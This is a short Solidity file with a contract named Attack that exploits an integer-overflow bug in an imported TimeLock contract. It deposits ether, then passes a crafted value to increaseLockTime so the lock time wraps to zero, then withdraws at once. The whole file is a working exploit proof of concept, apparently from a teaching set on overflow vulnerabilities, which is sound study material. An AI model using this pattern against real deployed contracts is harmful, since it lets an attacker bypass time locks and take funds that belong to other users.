pragma solidity ^0.7.6;
import "./overflow.sol";

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}

